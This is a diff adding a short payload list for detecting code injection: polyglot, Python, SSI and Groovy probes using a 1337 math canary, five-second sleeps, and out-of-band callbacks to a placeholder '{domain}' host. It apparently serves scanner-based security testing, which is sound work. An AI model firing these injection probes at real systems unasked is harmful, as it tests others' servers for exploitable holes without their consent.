@@ -1,0 +1,14 @@
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+##POLYGLOT - Code Injection Cross-Language (Timing)##
+__import__('time').sleep(5)
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+##SSI Injection - Math (1337)##
+<!--#set var="x" value="1337" --><!--#echo var="x" -->
+##Groovy Code Injection - Math-Based (Canary: 1337)##
+new GroovyShell().evaluate('7*191')
+##Groovy Code Injection - Timing##
+Thread.sleep(5000)
+##Groovy Code Injection - OOB##
+new URL('http://{domain}/groovy').text
